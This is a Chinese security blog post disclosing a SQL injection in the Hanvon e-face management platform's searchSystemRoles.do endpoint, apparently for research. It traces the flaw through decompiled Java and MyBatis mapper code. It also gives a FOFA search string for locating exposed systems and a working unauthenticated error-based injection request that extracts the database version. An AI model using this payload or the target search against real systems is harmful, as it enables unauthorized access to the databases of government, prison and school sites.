---
title: "汉王e脸通综合管理平台 searchSystemRoles.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-searchSystemRoles-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-searchsystemroles.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 searchSystemRoles.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/29 08:25
* 792浏览
* [0评论](#comment)
* 57分钟阅读

深入探索

数据库

计算机安全

认证


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `searchSystemRoles.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入检测工具

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

服务器安全服务

VPN服务

云安全解决方案

直接看 `SystemRoleMgrController` 里关于 `searchSystemRoles` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/searchSystemRoles.do"},
        method = {RequestMethod.GET}
    )
    public RequestJson searchSystemRoles(@RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "name") String roleName, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order) {
        RequestJson result = new RequestJson();

        try {
            this.loginCheck();
            DbPager pager = this.getPager(page, pageSize, columnKey, order);
            SystemRoleTpm systemRole = new SystemRoleTpm();
            systemRole.setName(roleName);
            List<SystemRoleTpm> systemRoleTpms = this.querySystemRoles(systemRole, pager);
            int numRows = pager.getRecordCount();
```

深入探索

编码转换工具

SQL注入防护

授权

跟进`querySystemRoles`方法

```
private List<SystemRoleTpm> querySystemRoles(SystemRoleTpm sysRole, DbPager pager) throws Exception {
        if (sysRole == null) {
            sysRole = new SystemRoleTpm();
        } else if (Utils.isEmpty(sysRole.getName(), true)) {
            sysRole.setName((String)null);
        }

        SessionalUser su = getSessionUser();
        Long currUserId = su.isAdmin() ? null : su.getId();
        List<SystemRoleTpm> systemRoleTpms = new ArrayList();
        if (pager == null) {
            List<SystemRoleTpm> tpms = (List)this.systemAsm.getSystemRoles(sysRole.getName(), currUserId, pager).getResult();
            if (tpms != null) {
                systemRoleTpms.addAll(tpms);
            }
        } else {
            List<SystemRoleTpm> tpms = (List)this.systemAsm.getSystemRoles(sysRole.getName(), currUserId, pager).getResult();
            if (tpms != null) {
                systemRoleTpms.addAll(tpms);
            }
        }

        return systemRoleTpms;
    }
```

继续跟进`getSystemRoles`方法

```
public List<SystemRoleTpm> getSystemRoles(String roleName, Long userId, DbPager pager) throws Exception {
        if (pager != null) {
            for(DbSort dbSort : pager.getDbSorts()) {
                String f = SystemRoleFieldConvert.getFieldName(dbSort.getSortField());
                if (null == f || f.equals("")) {
                    throw new Exception("不支持的排序属性：" + dbSort.getSortField());
                }

                dbSort.setSortField(f);
            }
        }

        int recordCount = 0;
        List<SystemRoleTpm> roles;
        if (userId != null && this.systemDsm.getAdminUserCount(userId) <= 0) {
            if (!this.fillUserRoleIdTable(userId, roleName)) {
                pager.setRecordCount(0);
                return null;
            }

            if (pager != null) {
                recordCount = this.systemDsm.getSystemRolesCount(roleName, userId);
                pager.setRecordCount(recordCount);
            }

            roles = this.systemDsm.getSystemRoles(roleName, userId, pager);
            this.dropUserRoleIdTable();
        } else {
            if (pager != null) {
                recordCount = this.systemDsm.getAllSystemRolesCount(roleName);
                pager.setRecordCount(recordCount);
            }

            roles = this.systemDsm.getAllSystemRoles(roleName, pager);
        }
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 SystemDsm.xml

代码安全审计

```
<!--分页查询-->
    <select id="getSystemRoles" resultMap="systemRoleNoCollection">
        <include refid="select_page_head"/>
        <include refid="select_system_role"/>
        inner join tmpUserRole t on t.id=s.ng_id
        <!--<where>-->
            <!--<if test="roleName != null">-->
                <!--s.sz_name LIKE CONCAT(CONCAT('%',#{roleName}),'%')-->
            <!--</if>-->
        <!--</where>-->
        <include refid="select_page_tail"/>
    </select>
    <sql id="select_page_head">
        <if test="pager != null">
        SELECT * FROM (
        </if>
    </sql>
    <sql id="select_system_role">
        SELECT DISTINCT s.ng_id, s.sz_name
        FROM sys_role AS s
    </sql>
    <sql id="select_page_tail">
        <if test="pager != null">
        ) p
        <choose>
            <when test="pager.dbSorts != null and pager.dbSorts.size()>0">
                <foreach item="item" collection="pager.dbSorts" open="order by " separator=",">
                    ${item.sortField} ${item.sortMode}
                </foreach>
            </when>
            <otherwise>
                ORDER BY ng_id ASC
            </otherwise>
        </choose>
        limit ${(pager.pageIndex - 1) * pager.pageSize} , ${pager.pageSize}
        </if>
    </sql>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/systemRoleMgr/searchSystemRoles.do?branchId=1&columnKey=id&deviceName=test&id=1&order=OR+EXTRACTVALUE(2605,CONCAT(0x5c,@@version,0x5c,(SELECT+(ELT(2605=2605,1)))))&page=1&pageSize=10&pointName=1&recoToken=SGUsqvF7cVS HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 searchSystemRoles.do SQL注入漏洞](images/img-001-b3275b5bdb3e.webp)](https://image.mrxn.net/ddee2766a9084a44ad1ecc1a385b94f8.webp)

成功利用报错注入获取到数据库版本号信息

漏洞扫描服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 searchSystemRoles.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-searchSystemRoles-sqli.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-searchSystemRoles-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-searchSystemRoles-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALfElEQVR4Aeyb3VrbyBJFveb935mTYrNkdanbMgkH+0J809naP1UtumQwZPLf7Xb7+Jv18fVh7RfdQF3UOOPmOq7q1AutqetaK971ytZSF0vbL/WOZtTlf4M1kD9113/vcgLbQP5M9/bMWt04cAM2u/fajK8LYMh/yQeA5OzXA+qFMGYh3BoIh6B61daC6BAsrZY5iA4j6nes2mfWvm4byF68rl93AoeBwDh9CD+7RZ8Ec/C4zrxonQip7z7Mdetm2HvMMnvNPIx7qYv7mkfXkD4w4qzmMJBZ6NJ+7wT+eSA+LTBOv+tnnxKM9eYhuvwR9j3lveZMh3FPCIfgs/167hn+zwN5ZpMr8/wJ/NhA+lMHeZq67q1BfLk5UX2FkHo4Yq+BZFa9Ib515jrqi/ryn8AfG8hP3MzV43Y7DMSpd1wdFvD58wQEP+s+6of/ecXKh9Rbtcp139wezUB66kG4fkeID0F9CH+2j3WidR3193gYyN68rn//BLaBQJ4CeIyrW3T6kPrOrYO5v8pbt0JIP+AQ6T1X3EJ9+bMIfH6V6HmIDo9xX7cNZC9e1687gf98Kr6L/ZYhT4F9INwchK98cyIkv+Lq9itUWyGkZ2VrrXLqkHznVVtLva5rdV7ad9f1CvEU3wQPA4E8FTCi9wvR5aJPAsSXn/nmIHU9L+8IycMRe1buXnJIrTqMXN38CiF1MMdeB/MccHzbe7s+XnoC2ysEMjWfCrHfXdfPuPWQ/ive+0Dy6qL18j3qiTD2ONPt1XPyFfa6VQ7G+7Fuj9tAVk0u/XdPYDkQyDT77UB0eA6dvn06V4f00xf1b7fb5+VKL1OvY3m1YNyjtFoQHUa0T2VqySG50mrByM2JEL9ziA53XA6kNrrW75/AtwfilPutrvSek5uHPB3qMHJ1EdY+zD2I7p72ErveuTmY9zEvml9hz8kLvz2Q1SaX/jMn8B+MU4eR920gvnpNtRZEr+v9MidCcnLRGrkIY77nID5gyYbA5++YrIFwCG7BrwtzX/SzFjj83zjdh/SDOZ71hXvd9QrxdN8Et99lQabkNGHk3q++CMnpQziMaF6E+L1u5Zt7BuFx71UPGOu8F/Mw+urmxK7DvK7nqv56hXgqb4KHgUCmWdOq1e8T4ne9so8WPK7r/TqH1MOI+z2t2Wv7a/0VmtWH7CXXh1GHkfdc5/YTIfXA9bus25t9HN5l9fuD+/Tg/o7D3Gr6kDpzK4Tncu5jHzmkHtDa3h0Bn9caEG7tpz75A+Y5iD4pGSRIzn1g5EP4DzFXePiS9ce//nvhCWzvss7uoaZXCzJtCPY6iF7ZWt3vvDK11CH18vJqQfS6rqW/x9Jny4wepBfM0TyMvvX6chGS14fw7nduvvB6hdQpvNHavodAptnvrU9TLkLq5NZDdAjqQ3jPyUXzncNYb67QbEcYa/SrZrb0RTMw9oGRm7NOhDEH4bP89Qrx1N4EDwOZTW1/r5DpqpmHuW4O4ps/w14nFyH94Bx7jXtDale+umhdR30Y+6l3tB6ShzseBtKLL/67J7AcCGRq/Xacrjokd6Z333oR0kcu9jr536A9IXvZA8K7LxchORhR337yjt2X73E5kN7s4r9zAt8eCIxPh9OF6N521yE+BM3ByLsO8SGo/wzCWOM9ifY44zD26XVw8I18Yu8PyUPwM/T1x7cH8lV3wf/pBA4/qUOm1qcq7wjzPIx6r+ufj766XFR/hJA9IWgW5hxG/WwvfdH+cniun3nRPoXXK6RO4Y3W9